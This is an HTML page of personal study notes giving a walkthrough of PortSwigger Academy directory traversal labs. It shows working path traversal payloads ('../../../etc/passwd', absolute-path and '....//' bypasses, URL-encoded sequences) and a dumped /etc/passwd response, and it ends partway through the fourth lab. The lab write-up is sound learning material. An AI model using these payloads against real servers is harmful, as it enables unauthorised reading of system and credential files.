@@ -1,0 +1,1047 @@
+
+<!DOCTYPE html>
+
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />
+
+    <title>Directory Traversal &#8212; Study Notes</title>
+    
+  <!-- Loaded before other Sphinx assets -->
+  <link href="../../_static/styles/theme.css?digest=1999514e3f237ded88cf" rel="stylesheet">
+<link href="../../_static/styles/pydata-sphinx-theme.css?digest=1999514e3f237ded88cf" rel="stylesheet">
+
+    
+  <link rel="stylesheet"
+    href="../../_static/vendor/fontawesome/5.13.0/css/all.min.css">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="../../_static/vendor/fontawesome/5.13.0/webfonts/fa-solid-900.woff2">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="../../_static/vendor/fontawesome/5.13.0/webfonts/fa-brands-400.woff2">
+
+    <link rel="stylesheet" type="text/css" href="../../_static/pygments.css" />
+    <link rel="stylesheet" href="../../_static/styles/sphinx-book-theme.css?digest=5115cc725059bd94278eecd172e13a965bf8f5a9" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/togglebutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/copybutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/mystnb.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-thebe.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/design-style.b7bb847fb20b106c3d81b95245e65545.min.css" />
+    
+  <!-- Pre-loaded scripts that we'll load fully later -->
+  <link rel="preload" as="script" href="../../_static/scripts/pydata-sphinx-theme.js?digest=1999514e3f237ded88cf">
+
+    <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
+    <script src="../../_static/jquery.js"></script>
+    <script src="../../_static/underscore.js"></script>
+    <script src="../../_static/doctools.js"></script>
+    <script src="../../_static/clipboard.min.js"></script>
+    <script src="../../_static/copybutton.js"></script>
+    <script src="../../_static/scripts/sphinx-book-theme.js?digest=9c920249402e914e316237a7dbc6769907cce411"></script>
+    <script>let toggleHintShow = 'Click to show';</script>
+    <script>let toggleHintHide = 'Click to hide';</script>
+    <script>let toggleOpenOnPrint = 'true';</script>
+    <script src="../../_static/togglebutton.js"></script>
+    <script>var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
+    <script src="../../_static/design-tabs.js"></script>
+    <script>const THEBE_JS_URL = "https://unpkg.com/thebe@0.8.2/lib/index.js"
+const thebe_selector = ".thebe,.cell"
+const thebe_selector_input = "pre"
+const thebe_selector_output = ".output, .cell_output"
+</script>
+    <script async="async" src="../../_static/sphinx-thebe.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="Authentication" href="auth.html" />
+    <link rel="prev" title="Server-Side Request Forgery (SSRF)" href="ssrf.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="docsearch:language" content="None">
+    
+
+    <!-- Google Analytics -->
+    
+  </head>
+  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="60">
+<!-- Checkboxes to toggle the left sidebar -->
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation" aria-label="Toggle navigation sidebar">
+<label class="overlay overlay-navbar" for="__navigation">
+    <div class="visually-hidden">Toggle navigation sidebar</div>
+</label>
+<!-- Checkboxes to toggle the in-page toc -->
+<input type="checkbox" class="sidebar-toggle" name="__page-toc" id="__page-toc" aria-label="Toggle in-page Table of Contents">
+<label class="overlay overlay-pagetoc" for="__page-toc">
+    <div class="visually-hidden">Toggle in-page Table of Contents</div>
+</label>
+<!-- Headers at the top -->
+<div class="announcement header-item noprint"></div>
+<div class="header header-item noprint"></div>
+
+    
+    <div class="container-fluid" id="banner"></div>
+
+    
+
+    <div class="container-xl">
+      <div class="row">
+          
+<!-- Sidebar -->
+<div class="bd-sidebar noprint" id="site-navigation">
+    <div class="bd-sidebar__content">
+        <div class="bd-sidebar__top"><div class="navbar-brand-box">
+    <a class="navbar-brand text-wrap" href="../../index.html">
+      
+      
+      
+      <h1 class="site-logo" id="site-title">Study Notes</h1>
+      
+    </a>
+</div><form class="bd-search d-flex align-items-center" action="../../search.html" method="get">
+  <i class="icon fas fa-search"></i>
+  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
+</form><nav class="bd-links" id="bd-docs-nav" aria-label="Main">
+    <div class="bd-toc-item active">
+        
+        <ul class="nav bd-sidenav bd-sidenav__home-link">
+            <li class="toctree-l1">
+                <a class="reference internal" href="../../intro.html">
+                    Overview
+                </a>
+            </li>
+        </ul>
+        <p aria-level="2" class="caption" role="heading">
+ <span class="caption-text">
+  Vulnerability Science
+ </span>
+</p>
+<ul class="nav bd-sidenav">
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../vs/languages/languages.html">
+   Languages
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" type="checkbox"/>
+  <label for="toctree-checkbox-1">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../vs/languages/assembly.html">
+     Assembly Language
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../vs/languages/cpp.html">
+     C/C++
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../vs/fuzzing.html">
+   Fuzzing
+  </a>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../vs/re/re.html">
+   Reverse Engineering
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" type="checkbox"/>
+  <label for="toctree-checkbox-2">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../vs/re/ghidra.html">
+     Ghidra
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../vs/re/virtual_funcs.html">
+     Reversing Virtual Functions
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../vs/postexploit.html">
+   Post-Exploitation
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../vs/webex.html">
+   Web Site Exploitation
+  </a>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../vs/passwords/passwords.html">
+   Password Cracking
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" type="checkbox"/>
+  <label for="toctree-checkbox-3">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../vs/passwords/searchspace.html">
+     Search Space Calculations
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../vs/passwords/hashcat.html">
+     HashCat
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../vs/passwords/john.html">
+     John the Ripper (aka John)
+    </a>
+   </li>
+  </ul>
+ </li>
+</ul>
+<p aria-level="2" class="caption" role="heading">
+ <span class="caption-text">
+  Capture The Flag
+ </span>
+</p>
+<ul class="current nav bd-sidenav">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../htb/htb.html">
+   Hack The Box (HTB)
+  </a>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../pico/picoctf.html">
+   PicoGym
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" type="checkbox"/>
+  <label for="toctree-checkbox-4">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/webex.html">
+     Web Exploitation
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/crypto.html">
+     Cryptography
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/re.html">
+     Reverse Engineering
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/forensics.html">
+     Forensics
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/general.html">
+     General Skills
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/binex.html">
+     Binary Exploitation
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/uncat.html">
+     Uncategorized
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/picomini.html">
+     PicoMINI
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/pico2019.html">
+     PicoCTF 2019
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/pico2020.html">
+     PicoCTF 2020 Mini-Competition
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../pico/pico2021.html">
+     PicoCTF 2021
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1 current active has-children">
+  <a class="reference internal" href="portswigger.html">
+   PortSwigger Academy
+  </a>
+  <input checked="" class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" type="checkbox"/>
+  <label for="toctree-checkbox-5">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul class="current">
+   <li class="toctree-l2">
+    <a class="reference internal" href="accesscontrol.html">
+     Access Control Vulnerabilities
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="xss.html">
+     Cross-Site Scripting
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="csrf.html">
+     Cross-site Request Forgery (CSRF)
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="clickjacking.html">
+     Clickjacking
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="domvuln.html">
+     DOM-based Vulnerabilities
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="cors.html">
+     Cross-Origin Resource Sharing (CORS)
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="xxe.html">
+     XML External Entity (XXE) injection
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="ssrf.html">
+     Server-Side Request Forgery (SSRF)
+    </a>
+   </li>
+   <li class="toctree-l2 current active">
+    <a class="current reference internal" href="#">
+     Directory Traversal
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="auth.html">
+     Authentication
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="websockets.html">
+     WebSockets
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="webcache.html">
+     Web Cache Poisoning
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="deserial.html">
+     Insecure Deserialization
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="infodisclosure.html">
+     Information Disclosure
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="logic.html">
+     Business Logic Vulnerabilities
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="hostheader.html">
+     HTTP Host Header Attacks
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="oauth.html">
+     OAuth Authentication
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="oscmdi.html">
+     OS Command Injection
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="sqi.html">
+     SQL Injection
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="reqsmuggling.html">
+     HTTP Request Smuggling
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="ssti.html">
+     Server-Side Template Injection
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../rz/ringzeroctf.html">
+   Ring Zero CTF
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" type="checkbox"/>
+  <label for="toctree-checkbox-6">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/coding.html">
+     Coding Challenges
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/crypto.html">
+     Cryptography
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/exoticdata.html">
+     Exotic Data Storage
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/forensics.html">
+     Forensics
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/jailescape.html">
+     Jail Escaping
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/javascript.html">
+     JavaScript
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/malware.html">
+     Malware Analysis
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/pwnage.html">
+     Pwnage Linux
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/re.html">
+     Reverse Engineering
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/sdr.html">
+     Software Defined Radio
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/shell.html">
+     Shellcoding
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/sqi.html">
+     SQL Injection
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/stego.html">
+     Steganography
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/sysadmin.html">
+     SysAdmin Linux
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/nc8re.html">
+     NC8 Reverse Engineering
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../rz/web.html">
+     Web Warning
+    </a>
+   </li>
+  </ul>
+ </li>
+</ul>
+<p aria-level="2" class="caption" role="heading">
+ <span class="caption-text">
+  Linux
+ </span>
+</p>
+<ul class="nav bd-sidenav">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../linux/lfs.html">
+   Linux From Scratch
+  </a>
+ </li>
+</ul>
+<p aria-level="2" class="caption" role="heading">
+ <span class="caption-text">
+  Miscellaneous
+ </span>
+</p>
+<ul class="nav bd-sidenav">
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../testbed/testbed.html">
+   Portable Testbed
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" type="checkbox"/>
+  <label for="toctree-checkbox-7">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../testbed/lanturtle.html">
+     Lan Turtle
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../testbed/pktsquirrel.html">
+     Packet Squirrel
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../testbed/virtual_machines.html">
+     Virtual Machine Hosting
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../testbed/vpn.html">
+     VPN
+    </a>
+   </li>
+  </ul>
+ </li>
+</ul>
+
+    </div>
+</nav></div>
+        <div class="bd-sidebar__bottom">
+             <!-- To handle the deprecated key -->
+            
+            <div class="navbar_extra_footer">
+            Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
+            </div>
+            
+        </div>
+    </div>
+    <div id="rtd-footer-container"></div>
+</div>
+
+
+          
+
+
+          
+<!-- A tiny helper pixel to detect if we've scrolled -->
+<div class="sbt-scroll-pixel-helper"></div>
+<!-- Main content -->
+<div class="col py-0 content-container">
+    
+    <div class="header-article row sticky-top noprint">
+        
+
+
+
+<div class="col py-1 d-flex header-article-main">
+    <div class="header-article__left">
+        
+        <label for="__navigation"
+  class="headerbtn"
+  data-toggle="tooltip"
+data-placement="right"
+title="Toggle navigation"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-bars"></i>
+  </span>
+
+</label>
+
+        
+    </div>
+    <div class="header-article__right">
+<div class="menu-dropdown menu-dropdown-launch-buttons">
+  <button class="headerbtn menu-dropdown__trigger"
+      aria-label="Launch interactive content">
+      <i class="fas fa-rocket"></i>
+  </button>
+  <div class="menu-dropdown__content">
+    <ul>
+      <li>
+        <a href="https://mybinder.org/v2/gh/argodev/Cogitation/master?urlpath=tree/docs/ctf/ps/dirtrav.ipynb"
+   class="headerbtn"
+   data-toggle="tooltip"
+data-placement="left"
+title="Launch on Binder"
+>
+  
+
+<span class="headerbtn__icon-container">
+  
+    <img src="../../_static/images/logo_binder.svg">
+  </span>
+<span class="headerbtn__text-container">Binder</span>
+</a>
+
+      </li>
+      
+    </ul>
+  </div>
+</div>
+
+<button onclick="toggleFullScreen()"
+  class="headerbtn"
+  data-toggle="tooltip"
+data-placement="bottom"
+title="Fullscreen mode"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-expand"></i>
+  </span>
+
+</button>
+
+<div class="menu-dropdown menu-dropdown-repository-buttons">
+  <button class="headerbtn menu-dropdown__trigger"
+      aria-label="Source repositories">
+      <i class="fab fa-github"></i>
+  </button>
+  <div class="menu-dropdown__content">
+    <ul>
+      <li>
+        <a href="https://github.com/argodev/Cogitation"
+   class="headerbtn"
+   data-toggle="tooltip"
+data-placement="left"
+title="Source repository"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fab fa-github"></i>
+  </span>
+<span class="headerbtn__text-container">repository</span>
+</a>
+
+      </li>
+      
+      <li>
+        <a href="https://github.com/argodev/Cogitation/issues/new?title=Issue%20on%20page%20%2Fctf/ps/dirtrav.html&body=Your%20issue%20content%20here."
+   class="headerbtn"
+   data-toggle="tooltip"
+data-placement="left"
+title="Open an issue"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-lightbulb"></i>
+  </span>
+<span class="headerbtn__text-container">open issue</span>
+</a>
+
+      </li>
+      
+    </ul>
+  </div>
+</div>
+
+<div class="menu-dropdown menu-dropdown-download-buttons">
+  <button class="headerbtn menu-dropdown__trigger"
+      aria-label="Download this page">
+      <i class="fas fa-download"></i>
+  </button>
+  <div class="menu-dropdown__content">
+    <ul>
+      <li>
+        <a href="../../_sources/ctf/ps/dirtrav.ipynb"
+   class="headerbtn"
+   data-toggle="tooltip"
+data-placement="left"
+title="Download source file"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-file"></i>
+  </span>
+<span class="headerbtn__text-container">.ipynb</span>
+</a>
+
+      </li>
+      
+      <li>
+        
+<button onclick="printPdf(this)"
+  class="headerbtn"
+  data-toggle="tooltip"
+data-placement="left"
+title="Print to PDF"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-file-pdf"></i>
+  </span>
+<span class="headerbtn__text-container">.pdf</span>
+</button>
+
+      </li>
+      
+    </ul>
+  </div>
+</div>
+<label for="__page-toc"
+  class="headerbtn headerbtn-page-toc"
+  
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-list"></i>
+  </span>
+
+</label>
+
+    </div>
+</div>
+
+<!-- Table of contents -->
+<div class="col-md-3 bd-toc show noprint">
+    <div class="tocsection onthispage pt-5 pb-3">
+        <i class="fas fa-list"></i> Contents
+    </div>
+    <nav id="bd-toc-nav" aria-label="Page">
+        <ul class="visible nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#file-path-traversal-simple-case">
+   File path traversal, simple case
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass">
+   File path traversal, traversal sequences blocked with absolute path bypass
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#file-path-traversal-traversal-sequences-stripped-non-recursively">
+   File path traversal, traversal sequences stripped non-recursively
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode">
+   File path traversal, traversal sequences stripped with superfluous URL-decode
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#file-path-traversal-validation-of-start-of-path">
+   File path traversal, validation of start of path
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#file-path-traversal-validation-of-file-extension-with-null-byte-bypass">
+   File path traversal, validation of file extension with null byte bypass
+  </a>
+ </li>
+</ul>
+
+    </nav>
+</div>
+    </div>
+    <div class="article row">
+        <div class="col pl-md-3 pl-lg-5 content-container">
+            <!-- Table of contents that is only displayed when printing the page -->
+            <div id="jb-print-docs-body" class="onlyprint">
+                <h1>Directory Traversal</h1>
+                <!-- Table of contents -->
+                <div id="print-main-content">
+                    <div id="jb-print-toc">
+                        
+                        <div>
+                            <h2> Contents </h2>
+                        </div>
+                        <nav aria-label="Page">
+                            <ul class="visible nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#file-path-traversal-simple-case">
+   File path traversal, simple case
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass">
+   File path traversal, traversal sequences blocked with absolute path bypass
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#file-path-traversal-traversal-sequences-stripped-non-recursively">
+   File path traversal, traversal sequences stripped non-recursively
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode">
+   File path traversal, traversal sequences stripped with superfluous URL-decode
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#file-path-traversal-validation-of-start-of-path">
+   File path traversal, validation of start of path
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#file-path-traversal-validation-of-file-extension-with-null-byte-bypass">
+   File path traversal, validation of file extension with null byte bypass
+  </a>
+ </li>
+</ul>
+
+                        </nav>
+                    </div>
+                </div>
+            </div>
+            <main id="main-content" role="main">
+                
+              <div>
+                
+  <section class="tex2jax_ignore mathjax_ignore" id="directory-traversal">
+<h1>Directory Traversal<a class="headerlink" href="#directory-traversal" title="Permalink to this headline">#</a></h1>
+<section id="file-path-traversal-simple-case">
+<h2>File path traversal, simple case<a class="headerlink" href="#file-path-traversal-simple-case" title="Permalink to this headline">#</a></h2>
+<div class="admonition-question admonition">
+<p class="admonition-title">Question</p>
+<p>This lab contains a file path traversal vulnerability in the display of product images.</p>
+<p>To solve the lab, retrieve the contents of the <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> file.</p>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>I tried to solve this using just a browser, but was unsuccessful. Primarily because the content type of the return is <code class="docutils literal notranslate"><span class="pre">image/jpeg</span></code> and since I’m pulling text (the <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> file), it simply doesn’t render properly in the chrome developer tools. NTS: use the tool.</p>
+</div>
+<p>Poking around a bit and found that the site dynamically loads images using the following structure:</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>https://ac101fa61fd2a9cdc02e17a800950081.web-security-academy.net/image?filename=37.jpg
+</pre></div>
+</div>
+<p>I simply found this request in the Burp Suite proxy, forwarded it to the repeater tool and edited the <code class="docutils literal notranslate"><span class="pre">filename</span></code> parameter to be <code class="docutils literal notranslate"><span class="pre">image?filename=../../../etc/passwd</span></code> and then sent the request. The response looked like the following:</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>HTTP/1.1 200 OK
+Content-Type: image/jpeg
+Connection: close
+Content-Length: 1260
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+peter:x:12001:12001::/home/peter:/bin/bash
+carlos:x:12002:12002::/home/carlos:/bin/bash
+user:x:12000:12000::/home/user:/bin/bash
+elmer:x:12099:12099::/home/elmer:/bin/bash
+academy:x:10000:10000::/home/academy:/bin/bash
+dnsmasq:x:101:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+messagebus:x:102:101::/nonexistent:/usr/sbin/nologin
+</pre></div>
+</div>
+</section>
+<hr class="docutils" />
+<section id="file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass">
+<h2>File path traversal, traversal sequences blocked with absolute path bypass<a class="headerlink" href="#file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass" title="Permalink to this headline">#</a></h2>
+<div class="admonition-question admonition">
+<p class="admonition-title">Question</p>
+<p>This lab contains a file path traversal vulnerability in the display of product images.</p>
+<p>The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.</p>
+<p>To solve the lab, retrieve the contents of the <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> file.</p>
+</div>
+<p>This one was pretty easy. Given a request like the following:</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>GET /image?filename=48.jpg HTTP/1.1
+</pre></div>
+</div>
+<p>I confirmed that it didn’t work the “easy way” by testing this:</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>GET /image?filename=../../../etc/passwd HTTP/1.1
+</pre></div>
+</div>
+<p>And received an error indicating the requested file did not exist. So, following the instructions, I adjusted the request as follows:</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>GET /image?filename=/etc/passwd HTTP/1.1
+</pre></div>
+</div>
+<p>And was rewarded with the contents of the <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> file.</p>
+</section>
+<hr class="docutils" />
+<section id="file-path-traversal-traversal-sequences-stripped-non-recursively">
+<h2>File path traversal, traversal sequences stripped non-recursively<a class="headerlink" href="#file-path-traversal-traversal-sequences-stripped-non-recursively" title="Permalink to this headline">#</a></h2>
+<div class="admonition-question admonition">
+<p class="admonition-title">question</p>
+<p>This lab contains a file path traversal vulnerability in the display of product images.</p>
+<p>The application strips path traversal sequences from the user-supplied filename before using it.</p>
+<p>To solve the lab, retrieve the contents of the <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> file.</p>
+</div>
+<p>The key to solving this lab is that the server-side code appears to be looking for instances of <code class="docutils literal notranslate"><span class="pre">../</span></code> and stripping them, but <em>non-recursively</em>. This means, that they might have a line that looks like the following bit of python:</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">safe_path</span> <span class="o">=</span> <span class="n">requested_path</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;../&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>If you provide a request that looks like this: <code class="docutils literal notranslate"><span class="pre">/image?filename=....//....//....//etc/passwd</span></code>, the value of <code class="docutils literal notranslate"><span class="pre">safe_path</span></code> still has a traversal problem, which means we will still get the file we are looking for which, is in fact, the case here.</p>
+</section>
+<hr class="docutils" />
+<section id="file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode">
+<h2>File path traversal, traversal sequences stripped with superfluous URL-decode<a class="headerlink" href="#file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode" title="Permalink to this headline">#</a></h2>
+<div class="admonition-question admonition">
+<p class="admonition-title">Question</p>
+<p>This lab contains a file path traversal vulnerability in the display of product images.</p>
+<p>The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.</p>
+<p>To solve the lab, retrieve the contents of the <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> file.</p>
+</div>
+<p>On this one, I tried URL-encoding the traversal attack as follows:</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>GET /image?filename=%2E%2E%2f%2E%2E%2f%2E%2E%2fetc%2fpasswd HTTP/1.1
